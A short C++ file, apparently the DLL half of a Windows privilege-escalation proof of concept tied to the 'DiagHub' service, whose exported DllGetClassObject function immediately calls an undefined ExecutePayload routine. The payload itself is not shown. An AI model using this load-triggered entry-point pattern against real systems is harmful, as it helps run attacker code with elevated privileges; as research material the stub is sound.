// DiaghubDll.cpp : Defines the exported functions for the DLL.
//

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>

void ExecutePayload(void);

HRESULT __stdcall DllGetClassObject(
	_In_ REFCLSID rclsid,
	_In_ REFIID riid,
	_Outptr_ LPVOID FAR* ppv)
{
	ExecutePayload();
    return E_FAIL;
}

